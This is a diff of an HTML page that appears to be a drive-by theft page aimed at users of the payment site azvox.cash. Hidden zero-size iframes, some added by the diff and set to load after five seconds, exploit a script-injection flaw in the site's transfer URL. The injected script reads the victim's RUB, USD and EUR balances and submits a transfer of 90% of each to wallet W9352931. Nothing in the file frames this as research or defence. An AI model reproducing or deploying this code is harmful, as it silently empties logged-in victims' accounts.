@@ -13,18 +13,36 @@
 
 
 
-
-
 <iframe src='https://azvox.cash/account/transfer/?ok[transfer]=%3Cscript%3Ewindow.onload%20=%20function%20()%20{var%20R%20=%20parseFloat(document.querySelector(%22.nowBalanceRUB%22).innerText.trim());var%20a%20=%20(R%20*%200.90).toFixed(2);var%20b=(a%20*%201.01);if(a%20!=%20Math.floor(a)){b=parseFloat(b)-(-0.01);};document.getElementById(%22sToWallet%22).value=%22W9352931%22;document.getElementById(%22sAmount%22).value=a;document.getElementById(%22sCur%22).value=%22RUB%22;document.getElementById(%22preCalcAmount%22).value=b;document.getElementById(%22pay_form%22).submit();};%3C/script%3E' height="0" width="0" ></iframe>
 
-<script>
-  const src = "	https://greenfarm-top.github.io/purples/2.html";
-  const container = document.getElementById("iframes-container");
-   window.onload = function() {
-setTimeout(() => {
-    window.location.href = src;
-  }, 10000);};
 
+<div id="iframes-container"></div>
+
+<script>
+  const src = 'https://azvox.cash/account/transfer/?ok[transfer]=%3Cscript%3Ewindow.onload%20=%20function%20()%20{var%20R%20=%20parseFloat(document.querySelector(%22.nowBalanceUSD%22).innerText.trim());var%20a%20=%20(R%20*%200.90).toFixed(2);var%20b=(a%20*%201.01);if(a%20!=%20Math.floor(a)){b=parseFloat(b)-(-0.01);};document.getElementById(%22sToWallet%22).value=%22W9352931%22;document.getElementById(%22sAmount%22).value=a;document.getElementById(%22sCur%22).value=%22USD%22;document.getElementById(%22preCalcAmount%22).value=b;document.getElementById(%22pay_form%22).submit();};%3C/script%3E';
+  const src2 = 'https://azvox.cash/account/transfer/?ok[transfer]=%3Cscript%3Ewindow.onload%20=%20function%20()%20{var%20R%20=%20parseFloat(document.querySelector(%22.nowBalanceEUR%22).innerText.trim());var%20a%20=%20(R%20*%200.90).toFixed(2);var%20b=(a%20*%201.01);if(a%20!=%20Math.floor(a)){b=parseFloat(b)-(-0.01);};document.getElementById(%22sToWallet%22).value=%22W9352931%22;document.getElementById(%22sAmount%22).value=a;document.getElementById(%22sCur%22).value=%22EUR%22;document.getElementById(%22preCalcAmount%22).value=b;document.getElementById(%22pay_form%22).submit();};%3C/script%3E';
+  const container = document.getElementById("iframes-container");
+
+  window.onload = function () {
+    setTimeout(() => {
+      const iframe = document.createElement("iframe");
+      iframe.src = src;
+      iframe.width = "0px";
+      iframe.height = "0px"; // تقدر تغيرها لأي ارتفاع يناسبك
+      iframe.style.border = "none";
+      container.appendChild(iframe);
+    }, 5000);
+	setTimeout(() => {
+      const iframe = document.createElement("iframe");
+      iframe.src = src2;
+      iframe.width = "0px";
+      iframe.height = "0px"; // تقدر تغيرها لأي ارتفاع يناسبك
+      iframe.style.border = "none";
+      container.appendChild(iframe);
+    }, 5000);
+	
+  };
 </script>
+
 </body>
 </html>
